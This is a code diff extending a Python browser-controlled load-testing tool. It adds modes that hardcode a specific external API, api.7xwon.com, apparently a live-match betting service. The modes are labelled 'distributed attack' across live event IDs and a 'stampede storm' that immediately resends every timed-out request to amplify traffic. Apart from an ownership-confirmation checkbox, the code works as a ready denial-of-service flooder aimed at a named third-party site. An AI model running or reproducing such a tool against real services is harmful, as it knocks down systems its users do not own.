@@ -1,5 +1,9 @@
 """Browser-based control panel for controlled API capacity checks.
 Optimized with AsyncIO & aiohttp for ultra-low PC CPU/RAM usage.
+Supports multi-scenario simulations:
+1. Main Events Polling (/main-events)
+2. All Live Matches distributed attack (/event)
+3. Cascading Abort / Stampede storm simulation
 """
 
 from __future__ import annotations
@@ -8,6 +12,7 @@ import asyncio
 import json
 import os
 import platform
+import random
 import statistics
 import threading
 import time
@@ -145,7 +150,36 @@ def validate_config(data):
     return url, method, rps, duration, threads, timeout, body
 
 
-async def _async_worker(session, method, url, headers, body, timeout, sem, state, results):
+async def fetch_live_event_ids(session, headers):
+    """Fetches currently active match event IDs from /main-events to simulate real browsing."""
+    try:
+        url = "https://api.7xwon.com/main-events"
+        payload = {"type": 0, "odds": 0, "code": False, "s": 1, "t": False}
+        async with session.post(url, json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=6.0)) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                items = []
+                if isinstance(data, dict):
+                    items = data.get("data") or data.get("events") or []
+                    if isinstance(items, dict):
+                        items = list(items.values())
+                elif isinstance(data, list):
+                    items = data
+                ids = []
+                for item in items:
+                    if isinstance(item, dict):
+                        eid = item.get("id") or item.get("eventid") or item.get("eventId")
+                        if eid:
+                            ids.append(int(eid))
+                if ids:
+                    return ids
+    except Exception:
+        pass
+    # Fallback known match IDs
+    return [36223071, 36223072, 36223073, 36223074, 36223075]
+
+
+async def _async_worker(session, method, url, headers, body, timeout, sem, state, results, is_cascading=False):
     if state.stop_event.is_set():
         return
     async with sem:
@@ -159,7 +193,6 @@ async def _async_worker(session, method, url, headers, body, timeout, sem, state
                 kwargs["json"] = body
 
             async with session.request(method, url, **kwargs) as resp:
-                # Read chunks to compute size without massive memory allocations
                 size = 0
                 error_msg = None
                 if resp.status >= 400:
@@ -167,7 +200,6 @@ async def _async_worker(session, method, url, headers, body, timeout, sem, state
                     size = len(raw)
                     error_msg = f"HTTP {resp.status}"
                 else:
-                    # Stream read without keeping full payload in memory
                     async for chunk in resp.content.iter_chunked(16384):
                         size += len(chunk)
                 
@@ -177,9 +209,16 @@ async def _async_worker(session, method, url, headers, body, timeout, sem, state
                 state.record(*res)
         except asyncio.TimeoutError:
             elapsed = (time.perf_counter() - started) * 1000
-            res = (None, elapsed, 0, f"Read timed out ({timeout}s)")
+            error_desc = f"Timeout ({timeout:.1f}s) -> Stampede Abort" if is_cascading else f"Read timed out ({timeout}s)"
+            res = (None, elapsed, 0, error_desc)
             results.append(res)
             state.record(*res)
+
+            # If cascading abort simulation is active: spawn an immediate retry request
+            # to simulate a client that aborts after 2.5s and immediately resends!
+            if is_cascading and not state.stop_event.is_set():
+                asyncio.create_task(_async_worker(session, method, url, headers, body, timeout, sem, state, results, False))
+
         except Exception as exc:
             elapsed = (time.perf_counter() - started) * 1000
             res = (None, elapsed, 0, str(exc))
@@ -187,7 +226,7 @@ async def _async_worker(session, method, url, headers, body, timeout, sem, state
             state.record(*res)
 
 
-async def _async_run_check(url, method, rps, duration, concurrency, timeout, token, body, state):
+async def _async_run_check(url, method, rps, duration, concurrency, timeout, token, body, state, scenarios):
     headers = {
         "Accept": "application/json",
         "User-Agent": USER_AGENT,
@@ -195,6 +234,13 @@ async def _async_run_check(url, method, rps, duration, concurrency, timeout, tok
     }
     if token:
         headers["Authorization"] = f"Bearer {token}"
+
+    sc_main = scenarios.get("main", True)
+    sc_all_matches = scenarios.get("all_matches", False)
+    sc_cascading = scenarios.get("cascading", False)
+
+    # In cascading abort simulation, client timeout is strictly 2.5 seconds
+    effective_timeout = 2.5 if sc_cascading else timeout
 
     sem = asyncio.Semaphore(concurrency)
     connector = aiohttp.TCPConnector(
@@ -211,6 +257,11 @@ async def _async_run_check(url, method, rps, duration, concurrency, timeout, tok
     tasks = []
 
     async with aiohttp.ClientSession(connector=connector) as session:
+        # Pre-fetch live event IDs if all_matches scenario is selected
+        event_ids = []
+        if sc_all_matches:
+            event_ids = await fetch_live_event_ids(session, headers)
+
         for index in range(total_requests):
             if state.stop_event.is_set():
                 break
@@ -223,8 +274,34 @@ async def _async_run_check(url, method, rps, duration, concurrency, timeout, tok
             if pause > 0:
                 await asyncio.sleep(pause)
 
+            # Route request based on selected scenario checkboxes
+            req_url = url
+            req_body = body
+            req_method = method
+
+            if sc_main and sc_all_matches:
+                # Alternate between /main-events and random match /event
+                if index % 2 == 0:
+                    req_url = "https://api.7xwon.com/main-events"
+                    req_method = "POST"
+                    req_body = body or {"type": 0, "odds": 1, "code": False, "s": 1, "t": False}
+                else:
+                    req_url = "https://api.7xwon.com/event"
+                    req_method = "POST"
+                    eid = random.choice(event_ids) if event_ids else 36223071
+                    req_body = {"id": eid}
+            elif sc_all_matches:
+                req_url = "https://api.7xwon.com/event"
+                req_method = "POST"
+                eid = random.choice(event_ids) if event_ids else 36223071
+                req_body = {"id": eid}
+            elif sc_main:
+                req_url = "https://api.7xwon.com/main-events"
+                req_method = "POST"
+                req_body = body or {"type": 0, "odds": 1, "code": False, "s": 1, "t": False}
+
             task = asyncio.create_task(
-                _async_worker(session, method, url, headers, body, timeout, sem, state, results)
+                _async_worker(session, req_method, req_url, headers, req_body, effective_timeout, sem, state, results, sc_cascading)
             )
             tasks.append(task)
 
@@ -270,9 +347,8 @@ async def _async_run_check(url, method, rps, duration, concurrency, timeout, tok
     }
 
 
-def run_check(url, method, rps, duration, threads, timeout, token, body, state):
-    # Runs the ultra-efficient async engine in the worker thread
-    return asyncio.run(_async_run_check(url, method, rps, duration, threads, timeout, token, body, state))
+def run_check(url, method, rps, duration, threads, timeout, token, body, state, scenarios):
+    return asyncio.run(_async_run_check(url, method, rps, duration, threads, timeout, token, body, state, scenarios))
 
 
 @app.get("/")
@@ -296,6 +372,12 @@ def run():
     if data.get("confirm") is not True:
         return jsonify({"error": "Test sahipligi onayi gerekli."}), 400
 
+    scenarios = data.get("scenarios") or {
+        "main": bool(data.get("sc_main")),
+        "all_matches": bool(data.get("sc_all_matches")),
+        "cascading": bool(data.get("sc_cascading"))
+    }
+
     run_id = str(data.get("run_id", "")).strip()
     state = RunState(rps * duration)
     if run_id:
@@ -304,7 +386,7 @@ def run():
     try:
         result = run_check(
             url, method, rps, duration, threads, timeout,
-            str(data.get("token", "")).strip(), body, state,
+            str(data.get("token", "")).strip(), body, state, scenarios
         )
     finally:
         with state.lock:
